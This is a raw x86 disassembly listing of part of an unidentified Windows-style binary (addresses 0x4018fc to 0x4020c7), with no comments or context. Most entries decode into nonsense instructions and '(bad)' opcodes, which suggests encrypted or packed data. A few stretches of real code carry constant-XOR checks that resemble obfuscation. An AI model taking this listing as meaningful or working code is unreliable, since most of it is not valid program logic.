  4018fc:	and    eax,0x179a5c8e
  401901:	in     eax,0xc
  401903:	jl     0x40197e
  401905:	inc    edi
  401906:	dec    ebp
  401907:	sbb    ah,BYTE PTR [edx-0x10]
  40190a:	gs (bad) 
  40190c:	mov    ds:0xd9967008,eax
  401911:	rol    BYTE PTR [esi],1
  401913:	cmp    ebx,DWORD PTR [ecx+0x35]
  401916:	retf   
  401917:	iret   
  401918:	pusha  
  401919:	sbb    eax,0x389ffb37
  40191e:	xchg   esp,eax
  40191f:	xchg   BYTE PTR [edx+0x53],bh
  401922:	enter  0xd992,0x1d
  401926:	call   0x8d10:0x10da1185
  40192d:	sbb    al,dl
  40192f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  401931:	cmp    BYTE PTR [ecx+ebx*2],dh
  401934:	fs push ss
  401936:	je     0x4018c4
  401938:	ss retf 
  40193a:	xchg   ebp,eax
  40193b:	add    eax,0x10179c88
  401940:	cmp    edx,DWORD PTR [ebp+esi*2+0x28f574bd]
  401947:	inc    ebp
  401948:	lea    eax,[edx-0x17d07bef]
  40194e:	xchg   ax,ax
  401950:	les    eax,FWORD PTR [edx]
  401952:	loop   0x401935
  401954:	xchg   ch,ch
  401956:	sub    DWORD PTR [ecx+0x6f],esi
  401959:	mov    ah,0xfb
  40195b:	fld    TBYTE PTR [edx]
  40195d:	and    bl,BYTE PTR [eax]
  40195f:	icebp  
  401960:	mov    dh,0xe5
  401962:	(bad)  
  401963:	pusha  
  401964:	test   DWORD PTR [ebp+0x19],esi
  401967:	inc    ebp
  401968:	push   0x68
  40196a:	dec    BYTE PTR [eax]
  40196c:	int3   
  40196d:	shl    DWORD PTR [esi+eiz*4-0x11],0x17
  401972:	(bad)  
  401973:	xor    eax,0x5c4b6055
  401978:	fisubr DWORD PTR [esi+ebx*4+0x21]
  40197c:	push   ecx
  40197d:	lods   al,BYTE PTR ds:[esi]
  40197e:	xchg   esi,eax
  40197f:	fdiv   DWORD PTR [esp+ecx*4+0x78]
  401983:	sti    
  401984:	cmp    bl,BYTE PTR [edi+0x7584abe4]
  40198a:	inc    esi
  40198b:	test   al,0x9f
  40198d:	sub    al,0x4c
  40198f:	lahf   
  401990:	stc    
  401991:	es add bl,bh
  401994:	test   eax,0xfe3b39c5
  401999:	cmp    DWORD PTR [esi-0x1d],ebp
  40199c:	jbe    0x40194f
  40199e:	ret    
  40199f:	dec    esp
  4019a0:	and    BYTE PTR [esi-0x223226e7],dh
  4019a6:	pop    ecx
  4019a7:	mov    edi,0xfa2223f0
  4019ac:	mov    al,0x3f
  4019ae:	fwait
  4019af:	xor    eax,edx
  4019b1:	cmp    eax,0x8cb40b7d
  4019b6:	je     0x4019d9
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	adc    ch,al
  401a1b:	cmp    ch,BYTE PTR [esp+eiz*4+0x7b]
  401a1f:	jo     0x401a91
  401a21:	xchg   edi,eax
  401a22:	jge    0x401a94
  401a24:	jo     0x401a41
  401a26:	xchg   edx,eax
  401a27:	inc    ebx
  401a28:	sub    DWORD PTR [eax+0x27],edi
  401a2b:	xor    al,0xb8
  401a2d:	(bad)  
  401a2e:	mov    ah,0x1b
  401a30:	sub    BYTE PTR [eax+0x13],bh
  401a33:	cmc    
  401a34:	mov    ebp,0xd34aff47
  401a39:	fisubr DWORD PTR [ebp+edx*1-0x621221e8]
  401a40:	mov    al,0x2c
  401a42:	lahf   
  401a43:	pop    es
  401a44:	dec    eax
  401a45:	out    0xcd,al
  401a47:	cli    
  401a48:	jns    0x401a00
  401a4a:	jo     0x401a07
  401a4c:	xor    eax,DWORD PTR [ecx+0x42]
  401a4f:	add    dh,dh
  401a51:	pop    ds
  401a52:	mov    cl,0xcc
  401a54:	sub    dh,0x41
  401a57:	cwde   
  401a58:	add    cl,BYTE PTR [edx-0x78]
  401a5b:	in     eax,dx
  401a5c:	mov    ebx,0x90df443b
  401a61:	sbb    BYTE PTR [esi-0x661de4b3],bl
  401a67:	dec    ecx
  401a68:	dec    edi
  401a69:	call   0x824e:0x44cd6549
  401a70:	add    eax,ecx
  401a72:	mov    ebx,0xb7fb5253
  401a77:	ss aas 
  401a79:	dec    eax
  401a7a:	adc    ecx,esi
  401a7c:	and    ah,BYTE PTR [ecx-0x4b4b0daf]
  401a82:	call   0xd42626d7
  401a87:	test   BYTE PTR [edi+0xc],ch
  401a8a:	mov    ah,0x6f
  401a8c:	jecxz  0x401b09
  401a8e:	cli    
  401a8f:	dec    esi
  401a90:	fwait
  401a91:	daa    
  401a92:	mov    esi,ss
  401a94:	and    esp,ebx
  401a96:	mov    esp,0x133c85a5
  401a9b:	pusha  
  401a9c:	mov    cs,WORD PTR [esi+0x7be1dee8]
  401aa2:	or     BYTE PTR [eax-0x5d],ah
  401aa5:	icebp  
  401aa6:	in     al,0x83
  401aa8:	(bad)  
  401aa9:	fmul   QWORD PTR [ecx]
  401aab:	stos   DWORD PTR es:[edi],eax
  401aac:	out    0x9a,al
  401aae:	div    DWORD PTR gs:[eax-0x37]
  401ab2:	scas   al,BYTE PTR es:[edi]
  401ab3:	cmp    al,0x1a
  401ab6:	lods   eax,DWORD PTR ds:[esi]
  401ab7:	das    
  401ab8:	mov    edx,0x7e03acd8
  401abd:	lods   al,BYTE PTR ds:[esi]
  401abe:	pop    ebp
  401abf:	or     ecx,ebp
  401ac1:	pop    ebp
  401ac2:	dec    eax
  401ac3:	or     bl,BYTE PTR [esi]
  401ac5:	mov    ds:0xc831130d,al
  401aca:	js     0x401ad3
  401acc:	lods   al,BYTE PTR ds:[esi]
  401acd:	xor    edi,esi
  401acf:	sar    dh,1
  401ad1:	clc    
  401ad2:	sub    DWORD PTR [ebx+ebp*1-0x47e6e5d9],ecx
  401ad9:	ss xchg esp,eax
  401adb:	dec    ecx
  401adc:	push   ds
  401add:	sub    bh,BYTE PTR [edi-0xb]
  401ae0:	jle    0x401ad6
  401ae2:	sbb    BYTE PTR [esi],0x13
  401ae5:	retf   0x800b
  401ae8:	daa    
  401ae9:	mov    esp,ebx
  401aeb:	xchg   ecx,eax
  401aec:	jle    0x401a8e
  401aee:	fwait
  401aef:	rcr    BYTE PTR [ebx-0x19],cl
  401af2:	cld    
  401af3:	sbb    BYTE PTR [ecx-0x4000641a],bh
  401af9:	sbb    DWORD PTR [eax],edi
  401afb:	mov    bh,0xe6
  401afd:	jo     0x401ae9
  401aff:	test   DWORD PTR [ecx],esp
  401b01:	and    dl,ch
  401b03:	rol    BYTE PTR ds:0x93ffe3f6,cl
  401b09:	xchg   ebx,eax
  401b0a:	xlat   BYTE PTR ds:[ebx]
  401b0b:	jb     0x401b05
  401b0d:	shl    BYTE PTR [ebx+0x6d],cl
  401b10:	test   eax,0xeec8b1bf
  401b15:	add    ecx,0xffffffaf
  401b18:	lods   eax,DWORD PTR ds:[esi]
  401b19:	pop    ds
  401b1a:	dec    esi
  401b1b:	mov    edx,0xd006e49d
  401b20:	and    al,0xb7
  401b22:	outs   dx,BYTE PTR ds:[esi]
  401b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b24:	cs dec ebp
  401b26:	mov    dl,0xf7
  401b28:	xchg   edx,eax
  401b29:	pop    ebx
  401b2a:	in     al,0x6d
  401b2c:	paddsw mm0,QWORD PTR [ebp+0x75b946cb]
  401b33:	xor    DWORD PTR [esi-0x3f8743],edx
  401b39:	js     0x401b15
  401b3b:	and    edx,DWORD PTR [edx-0xe]
  401b3e:	test   al,0x7d
  401b40:	inc    esp
  401b41:	enter  0x1c83,0xd9
  401b45:	neg    DWORD PTR [ebx+edi*8+0x78]
  401b49:	ret    0x5d9f
  401b4c:	push   ebx
  401b4d:	rcl    BYTE PTR [edi+0x12a65b7f],1
  401b53:	shl    DWORD PTR [edx-0x7cfeb974],cl
  401b59:	xchg   ebx,eax
  401b5a:	ret    
  401b5b:	lds    esi,FWORD PTR [ebp-0x65]
  401b5e:	push   0x5
  401b60:	xchg   edx,eax
  401b61:	in     al,dx
  401b62:	lahf   
  401b63:	inc    edi
  401b64:	ins    DWORD PTR es:[edi],dx
  401b65:	lods   eax,DWORD PTR ds:[esi]
  401b66:	xchg   ebx,eax
  401b67:	(bad)  
  401b68:	fs imul edx,esp,0x59
  401b6c:	jmp    0x6ef7:0x15155456
  401b73:	rcr    BYTE PTR [ecx],0x2d
  401b76:	sbb    DWORD PTR [ecx+ecx*8],ebx
  401b79:	sub    BYTE PTR [edi-0x48],bh
  401b7c:	in     al,dx
  401b7d:	push   esi
  401b7e:	outs   dx,DWORD PTR ds:[esi]
  401b7f:	frstor [eax+0x37c81d8c]
  401b85:	lods   eax,DWORD PTR ds:[esi]
  401b86:	jb     0x401bd9
  401b88:	inc    ecx
  401b89:	mov    edi,0x5b22b8d2
  401b8e:	stc    
  401b8f:	mov    BYTE PTR [ebp-0x46c3b164],bl
  401b95:	xor    al,0x8
  401b97:	sbb    edi,DWORD PTR [edi-0x225cbf9]
  401b9d:	scas   al,BYTE PTR es:[edi]
  401b9e:	inc    esp
  401b9f:	lds    ebp,FWORD PTR [esi-0x7422d954]
  401ba5:	sbb    DWORD PTR [eax+esi*1],0xffffffeb
  401ba9:	jmp    0x401ba5
  401bab:	pop    ebx
  401bac:	push   cs
  401bad:	cwde   
  401bae:	xor    BYTE PTR [esi+0x4d3a78d5],ch
  401bb4:	mov    ?,edx
  401bb6:	jg     0x401c13
  401bb8:	or     al,0x35
  401bba:	lock push esp
  401bbc:	pop    esi
  401bbd:	cs xchg edx,eax
  401bbf:	xchg   edi,eax
  401bc0:	sub    eax,0x721f61f9
  401bc5:	daa    
  401bc6:	rcl    BYTE PTR [ebx],cl
  401bc8:	call   0x3c2ea797
  401bcd:	into   
  401bce:	fwait
  401bcf:	pushf  
  401bd0:	cmp    bl,BYTE PTR [ebx+0x69]
  401bd3:	push   0x582fda5c
  401bd8:	inc    ebp
  401bd9:	xchg   ebp,eax
  401bda:	out    0x7a,eax
  401bdc:	jne    0x401c27
  401bde:	icebp  
  401bdf:	mov    edx,0xc9f700fd
  401be4:	add    eax,0xb935b3a2
  401be9:	iret   
  401bea:	int3   
  401beb:	lock cwde 
  401bed:	or     eax,0xa861ed4
  401bf2:	lds    eax,FWORD PTR [ecx-0x286565aa]
  401bf8:	call   0x73ae42c8
  401bfd:	mov    ecx,0x7fae33a0
  401c02:	loop   0x401c4c
  401c04:	int    0x37
  401c06:	in     al,dx
  401c07:	aad    0xe9
  401c09:	scas   eax,DWORD PTR es:[edi]
  401c0a:	das    
  401c0b:	fcmovnu st,st(0)
  401c0d:	(bad)  
  401c0e:	jne    0x401c54
  401c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c11:	mov    ebp,0xcf645657
  401c16:	xchg   ecx,eax
  401c17:	icebp  
  401c18:	adc    al,0x30
  401c1a:	repz sbb DWORD PTR [si+0x16e9],edi
  401c20:	add    edx,DWORD PTR [esi+0x3b]
  401c23:	loopne 0x401bcb
  401c25:	sar    BYTE PTR [ecx],cl
  401c27:	jnp    0x401c77
  401c29:	imul   ebx,DWORD PTR [ebx],0xb4f2c39d
  401c2f:	cmc    
  401c30:	xor    DWORD PTR [edx-0x4e2fec45],eax
  401c36:	mov    BYTE PTR ds:0xd1c9c25a,ch
  401c3c:	leave  
  401c3d:	pop    ds
  401c3e:	loope  0x401cb2
  401c40:	std    
  401c41:	push   edi
  401c42:	adc    esi,DWORD PTR ds:0x2191ecde
  401c48:	(bad)  
  401c4a:	scas   al,BYTE PTR es:[edi]
  401c4b:	sub    eax,0x4447bc13
  401c50:	inc    eax
  401c51:	or     BYTE PTR [edx+0x4d015f10],dh
  401c57:	pop    ebx
  401c58:	(bad)  
  401c59:	hlt    
  401c5a:	inc    eax
  401c5b:	jecxz  0x401c29
  401c5d:	fidiv  DWORD PTR [esi-0x67c5639a]
  401c63:	fdivr  DWORD PTR gs:[eax]
  401c66:	add    eax,0x65e24364
  401c6b:	ret    0x9dce
  401c6e:	add    eax,0x2eb55759
  401c73:	push   edx
  401c74:	lea    esi,[ecx]
  401c76:	adc    al,0xc3
  401c78:	push   ss
  401c79:	scas   al,BYTE PTR es:[edi]
  401c7a:	add    eax,0xda3fc86a
  401c7f:	ret    
  401c80:	mov    ebp,0x1737e52d
  401c85:	data16 mov ds:0x5a2cd576,al
  401c8b:	xor    BYTE PTR [edx],0x4
  401c8e:	pop    ebx
  401c8f:	aad    0x3a
  401c91:	scas   al,BYTE PTR es:[edi]
  401c92:	icebp  
  401c93:	ins    BYTE PTR es:[edi],dx
  401c94:	mov    al,0xe4
  401c96:	push   cs
  401c97:	or     BYTE PTR [edi-0x57242879],dl
  401c9d:	add    al,0xf9
  401c9f:	inc    edi
  401ca0:	addr16 push ss
  401ca2:	mov    al,ds:0x100ee1c3
  401ca7:	daa    
  401ca8:	ror    bl,1
  401caa:	sub    ch,BYTE PTR [edx]
  401cac:	fdivr  st,st(2)
  401cae:	jb     0x401cfd
  401cb0:	leave  
  401cb1:	cs hlt 
  401cb3:	mov    BYTE PTR ds:0xef011a6d,ah
  401cb9:	adc    ah,BYTE PTR [ebx]
  401cbb:	cmc    
  401cbc:	mov    fs,ebx
  401cbe:	sub    DWORD PTR [ebx+0x507f8727],ecx
  401cc4:	add    DWORD PTR [edi-0x7e],eax
  401cc7:	sub    cl,cl
  401cc9:	mov    ss,WORD PTR [ecx+eiz*1]
  401ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ccd:	jmp    0x83fc26dd
  401cd2:	ja     0x401cf1
  401cd4:	nop
  401cd5:	test   DWORD PTR [edx-0x11196af6],edi
  401cdb:	push   esi
  401cdc:	or     DWORD PTR [ecx+0x5],0x38d1573
  401ce3:	test   DWORD PTR [ebx],esi
  401ce5:	retf   0x6791
  401ce8:	jl     0x401d58
  401cea:	gs (bad) 
  401cec:	(bad)  
  401ced:	cli    
  401cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cef:	cmp    al,0x7e
  401cf1:	sbb    ch,BYTE PTR [edx-0x19]
  401cf4:	mov    bl,0x0
  401cf6:	xchg   edx,eax
  401cf7:	and    al,0xf3
  401cf9:	mov    es,WORD PTR ds:0x9a5c44af
  401cff:	loop   0x401d6d
  401d01:	push   ebx
  401d02:	ror    ah,0x9c
  401d05:	xchg   BYTE PTR [eax-0x69],ch
  401d08:	pushf  
  401d09:	in     eax,dx
  401d0a:	dec    eax
  401d0b:	(bad)  [ebx+eiz*4-0x748a0f87]
  401d12:	fcmovnu st,st(1)
  401d14:	and    eax,0x786f0183
  401d19:	add    ch,BYTE PTR [ebx]
  401d1b:	xchg   ecx,eax
  401d1c:	call   0x5d094110
  401d21:	push   ebp
  401d22:	xlat   BYTE PTR ds:[ebx]
  401d23:	cmp    dh,BYTE PTR [esi-0x41]
  401d26:	std    
  401d27:	(bad)  ds:0x496efd2e
  401d2d:	jns    0x401d4c
  401d2f:	test   BYTE PTR [edi+edi*8-0x4e71669e],0xcd
  401d37:	adc    al,0xc8
  401d39:	arpl   di,di
  401d3b:	fbstp  TBYTE PTR [esi]
  401d3d:	xor    DWORD PTR [eax+ebx*8+0x5fd9ab8a],0xdaabbcd4
  401d48:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d4a:	in     eax,dx
  401d4b:	addr16 ja 0x401d34
  401d4e:	xchg   esi,eax
  401d4f:	pop    ds
  401d50:	jge    0x401ce5
  401d52:	(bad)  
  401d53:	fist   WORD PTR [edi+0x3f]
  401d56:	aaa    
  401d57:	frstor [esi+edx*8+0x34]
  401d5b:	gs cmp eax,0x809d58d
  401d61:	push   es
  401d62:	push   cs
  401d63:	jae    0x401cf7
  401d65:	in     al,dx
  401d66:	push   0x62
  401d68:	sub    cl,bl
  401d6a:	arpl   WORD PTR [ebx-0x62],dx
  401d6d:	jns    0x401db9
  401d6f:	dec    ebp
  401d70:	sbb    esi,ecx
  401d72:	inc    ebp
  401d73:	push   0xffffff85
  401d75:	jl     0x401de3
  401d77:	sbb    al,0x9a
  401d79:	push   ss
  401d7a:	xchg   ebp,ebp
  401d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7d:	jnp    0x401df7
  401d7f:	fs pop eax
  401d81:	sub    edi,DWORD PTR [ebx-0x49]
  401d84:	push   edi
  401d85:	jl     0x401d69
  401d87:	pushf  
  401d88:	(bad)  
  401d89:	outs   dx,DWORD PTR ds:[esi]
  401d8a:	pushf  
  401d8b:	mov    al,ds:0xec8fc4a1
  401d90:	ficomp WORD PTR [ebx+eiz*1]
  401d93:	lahf   
  401d94:	push   ebx
  401d95:	scas   eax,DWORD PTR es:[edi]
  401d96:	or     al,BYTE PTR [ecx+eiz*4]
  401d99:	mov    edx,0x5223b7b5
  401d9e:	adc    DWORD PTR [edi+0x263f2f35],0x6f
  401da5:	icebp  
  401da6:	dec    ecx
  401da7:	or     esi,DWORD PTR [esp+ebp*2]
  401daa:	xchg   edi,eax
  401dab:	pop    es
  401dac:	mov    ecx,0x8ae17005
  401db1:	cmp    BYTE PTR [edx+0x4a],bh
  401db4:	and    al,0xc2
  401db6:	xor    al,0x35
  401db8:	mov    eax,esp
  401dba:	jp     0x401e36
  401dbc:	add    al,0x6f
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434366,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	jbe    0x401df6
  401df1:	mov    bh,0xfa
  401df3:	cmp    eax,DWORD PTR [edi]
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401db5
  401dfc:	stos   DWORD PTR es:[edi],eax
  401dfd:	adc    DWORD PTR ds:0x7916bd45,ecx
  401e03:	jmp    0x401e33
  401e05:	push   ebx
  401e06:	pushf  
  401e07:	xor    BYTE PTR [ebp+0x69],ah
  401e0a:	mov    ?,WORD PTR [esi]
  401e0c:	adc    BYTE PTR ds:0x38d15f69,ch
  401e12:	mov    ecx,0x659bb21c
  401e17:	mov    cl,0xce
  401e19:	inc    ecx
  401e1a:	mov    edx,0xfed63303
  401e1f:	ds pop ebp
  401e21:	pop    esp
  401e22:	sbb    DWORD PTR [eax-0x33d2a3d3],edi
  401e28:	inc    ecx
  401e29:	jnp    0x401e68
  401e2b:	mov    ebp,0xcd363e0
  401e30:	adc    al,ch
  401e32:	sub    BYTE PTR [ebp+0x10],ch
  401e35:	popa   
  401e36:	mov    ds:0x5d894e4,eax
  401e3b:	test   BYTE PTR [esi],0xe8
  401e3e:	pop    ss
  401e3f:	adc    DWORD PTR [ebp-0x18fdd50f],eax
  401e45:	push   esp
  401e46:	(bad)  
  401e47:	repz pushf 
  401e49:	repz adc DWORD PTR [ebx+0x2e],edi
  401e4d:	(bad)  
  401e4e:	push   eax
  401e4f:	pop    edi
  401e50:	pop    ebp
  401e51:	and    eax,0x373c480f
  401e56:	popa   
  401e57:	jae    0x401e6e
  401e59:	popa   
  401e5a:	jae    0x401de3
  401e5c:	inc    esi
  401e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e5e:	push   edi
  401e5f:	adc    eax,0x4ec5eef3
  401e64:	jne    0x401de7
  401e66:	jb     0x401e51
  401e68:	pop    edi
  401e69:	push   esi
  401e6a:	or     DWORD PTR [ecx+0x52],esi
  401e6d:	fidiv  WORD PTR [ecx]
  401e6f:	xchg   esi,eax
  401e70:	adc    DWORD PTR [ebp+0x39eea5ce],ebp
  401e76:	jg     0x401e31
  401e78:	add    ebp,DWORD PTR ds:0x6a611f5
  401e7e:	and    dl,BYTE PTR [eax]
  401e80:	mov    ebx,edi
  401e82:	pop    ebp
  401e83:	push   cs
  401e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e85:	push   ss
  401e86:	dec    ecx
  401e87:	lock xor al,0x4f
  401e8a:	aas    
  401e8b:	stos   DWORD PTR es:[edi],eax
  401e8c:	mov    edx,0x51468afb
  401e91:	test   DWORD PTR es:[ebp+eax*1+0x523f2bdb],eax
  401e99:	pop    esp
  401e9a:	lds    ebx,FWORD PTR [esi-0x1720d0fa]
  401ea0:	(bad)  
  401ea2:	xchg   ebx,eax
  401ea3:	add    ebx,DWORD PTR ds:0x14d7e83a
  401ea9:	(bad)  
  401eaa:	mov    ebx,0x893385bc
  401eaf:	jecxz  0x401ef2
  401eb1:	outs   dx,DWORD PTR ds:[esi]
  401eb2:	aam    0x69
  401eb4:	call   FWORD PTR [esi-0x4d69ba3e]
  401eba:	inc    edi
  401ebb:	aad    0xcf
  401ebd:	int    0x1
  401ebf:	js     0x401e46
  401ec1:	add    ah,BYTE PTR [edx-0x55]
  401ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ec5:	jg     0x401ea6
  401ec7:	jno    0x401ea2
  401ec9:	inc    esi
  401eca:	and    DWORD PTR [edx-0x3792d632],ebp
  401ed0:	xor    esi,DWORD PTR [edx]
  401ed2:	add    BYTE PTR [eax+0x5bb8c94f],dl
  401ed8:	mov    ch,0x6a
  401eda:	jmp    esp
  401edc:	mov    ebx,0x44b8ec66
  401ee1:	jp     0x401f0e
  401ee3:	test   DWORD PTR [edx+0x71],ebx
  401ee6:	call   0x7fdd:0x461dbd12
  401eed:	mov    bl,0xf7
  401eef:	scas   al,BYTE PTR es:[edi]
  401ef0:	aad    0x51
  401ef2:	mov    al,BYTE PTR [ecx+0x1e]
  401ef5:	rcr    bl,1
  401ef7:	jb     0x401ea7
  401ef9:	cmp    BYTE PTR [ecx+0x2b],ch
  401efc:	fcomp  DWORD PTR [edx-0xb40ea52]
  401f02:	mov    edx,0x25bf7bf0
  401f07:	aam    0x27
  401f09:	sbb    BYTE PTR [edx*8-0x14e2de30],bl
  401f10:	jmp    0x675e8f66
  401f15:	jmp    0xb292:0xda7cc4d
  401f1c:	or     DWORD PTR [ebx+eax*4-0x104b64f],0xc36ce089
  401f27:	add    DWORD PTR [esi-0x113be477],0x37
  401f2e:	cwde   
  401f2f:	pop    ebp
  401f30:	(bad)  
  401f31:	aad    0x98
  401f33:	hlt    
  401f34:	jbe    0x401f3e
  401f36:	and    DWORD PTR [esi-0x1e50a886],ecx
  401f3c:	xor    edx,DWORD PTR [esi+0x168c19d6]
  401f42:	int    0x6a
  401f44:	lea    ecx,[eax]
  401f46:	test   BYTE PTR [eax-0x1f],dh
  401f49:	push   ds
  401f4a:	stos   BYTE PTR es:[edi],al
  401f4b:	and    esp,edi
  401f4d:	imul   ebp,DWORD PTR [ecx],0xafea7d4e
  401f53:	pop    ecx
  401f54:	sbb    dh,BYTE PTR [esi+ecx*1-0x3287c93c]
  401f5b:	adc    esp,DWORD PTR [ecx]
  401f5d:	and    ebp,DWORD PTR ds:0xbb93b96f
  401f63:	cmp    al,0xc2
  401f65:	add    eax,0x60f3b907
  401f6a:	mov    cl,0x58
  401f6c:	mov    ebx,0xc908f0e0
  401f71:	out    0x58,eax
  401f73:	(bad)  
  401f74:	jns    0x401f76
  401f76:	into   
  401f77:	cmp    BYTE PTR [ecx+esi*8-0x7a],bh
  401f7b:	xor    eax,DWORD PTR [eax]
  401f7d:	mov    al,ds:0x813f9f2a
  401f82:	retf   
  401f83:	adc    ch,BYTE PTR [ecx]
  401f85:	pop    eax
  401f86:	pushf  
  401f87:	rcl    BYTE PTR [ebp-0x3984bf02],1
  401f8d:	test   eax,0x29f4222
  401f92:	retf   
  401f93:	popa   
  401f94:	leave  
  401f95:	lahf   
  401f96:	imul   esi,ebp,0x27
  401f99:	mov    esp,0xd402cfa1
  401f9e:	setl   BYTE PTR [ecx-0x35]
  401fa2:	jae    0x401f75
  401fa4:	pop    edx
  401fa5:	aas    
  401fa6:	sbb    ebp,DWORD PTR [eax+0x25b67423]
  401fac:	pop    edi
  401fad:	jmp    0x401f7d
  401faf:	xor    DWORD PTR [edi+0x5f862934],esp
  401fb5:	or     esi,ebp
  401fb7:	ror    DWORD PTR [esi],0x21
  401fba:	popa   
  401fbb:	ret    
  401fbc:	ins    BYTE PTR es:[edi],dx
  401fbd:	and    DWORD PTR [ecx+edi*2],edx
  401fc0:	mov    ebx,0x55705ca7
  401fc5:	cdq    
  401fc6:	dec    edx
  401fc7:	(bad)
  401fcb:	loope  0x401fe6
  401fcd:	ret    
  401fce:	and    esp,ebx
  401fd0:	sbb    al,0x25
  401fd2:	in     eax,0xa2
  401fd4:	xchg   esi,eax
  401fd5:	and    BYTE PTR [ecx+0x7b00d4c7],dl
  401fdb:	ins    BYTE PTR es:[edi],dx
  401fdc:	shr    DWORD PTR [esi+0x6d],1
  401fdf:	sbb    al,0xc3
  401fe1:	inc    edi
  401fe2:	lods   al,BYTE PTR ds:[esi]
  401fe3:	and    BYTE PTR [ecx],dh
  401fe5:	cld    
  401fe6:	(bad)  
  401fe7:	xchg   edx,eax
  401fe8:	ja     0x402000
  401fea:	neg    BYTE PTR [edi]
  401fec:	mov    esi,0x962d12c
  401ff1:	inc    ebp
  401ff2:	inc    eax
  401ff3:	outs   dx,BYTE PTR ds:[esi]
  401ff4:	(bad)  
  401ff5:	and    ah,dl
  401ff7:	dec    DWORD PTR [edx-0x6b]
  401ffa:	fidivr DWORD PTR [esi-0x58a36068]
  402000:	stos   DWORD PTR es:[edi],eax
  402001:	retf   
  402002:	xor    DWORD PTR [eax-0xc],ebp
  402005:	aam    0x93
  402007:	cmc    
  402008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402009:	test   DWORD PTR [eax+esi*4+0x2e80ae32],eax
  402010:	cld    
  402011:	mov    BYTE PTR [esi],ah
  402013:	mov    dh,0x56
  402015:	add    eax,0x999324ee
  40201a:	jo     0x401fd7
  40201c:	mov    al,0x69
  40201e:	shl    BYTE PTR [eax],0x83
  402021:	inc    ecx
  402022:	inc    esp
  402023:	std    
  402024:	fsub   st,st(0)
  402026:	iret   
  402027:	xchg   BYTE PTR [edx-0x5],dh
  40202a:	js     0x401fc2
  40202c:	call   0xef52:0x6a6b0f29
  402033:	data16 add dl,BYTE PTR [ebp+ebp*8-0x4d584c2e]
  40203b:	sub    eax,0xc0aa8b81
  402040:	or     BYTE PTR [esp+edi*4],dl
  402043:	mov    ah,0xe
  402045:	hlt    
  402046:	in     eax,0xd1
  402048:	(bad)  
  402049:	jp     0x40201c
  40204b:	dec    ecx
  40204c:	out    dx,al
  40204d:	std    
  40204e:	push   edx
  40204f:	jb     0x401ff0
  402051:	sbb    cl,BYTE PTR [ecx+0x3f]
  402054:	data16 icebp 
  402056:	push   cs
  402057:	stc    
  402058:	cmp    DWORD PTR [edi-0x7],ecx
  40205b:	addr16 push ss
  40205d:	and    eax,0x42f4d935
  402062:	int    0x62
  402064:	adc    al,0xc7
  402066:	jnp    0x40200d
  402068:	cli    
  402069:	pop    DWORD PTR [ebx]
  40206b:	das    
  40206c:	out    dx,al
  40206d:	scas   eax,DWORD PTR es:[edi]
  40206e:	test   al,0x9c
  402070:	cpuid  
  402072:	jg     0x402074
  402074:	inc    ebp
  402075:	xchg   ebp,eax
  402076:	call   0x79fd:0xd8c767b4
  40207d:	daa    
  40207e:	pop    ebx
  40207f:	xchg   edi,eax
  402080:	loopne 0x40201e
  402082:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402085:	out    0x4a,eax
  402087:	nop
  402088:	fisub  WORD PTR [ebp+0x4946688f]
  40208e:	mov    ss:0x542bbfaa,al
  402094:	imul   eax,DWORD PTR [ebx+ebx*8-0x66fca146],0x32bcf3b3
  40209f:	(bad)  
  4020a0:	popa   
  4020a1:	add    eax,0xfadd40c3
  4020a6:	and    esp,DWORD PTR [edx+0x52]
  4020a9:	mov    esi,0x598b4eee
  4020ae:	dec    ecx
  4020af:	sti    
  4020b0:	in     eax,0x3f
  4020b2:	adc    eax,0x50d4aa1d
  4020b7:	mov    esi,0x59503eb4
  4020bc:	inc    esp
  4020bd:	mov    dl,0xf3
  4020bf:	dec    edi
  4020c0:	pop    ebp
  4020c1:	cld    
  4020c2:	cmp    bh,BYTE PTR [ebp-0x2d]
  4020c5:	and    cl,dh
  4020c7:	xor    esp,eax
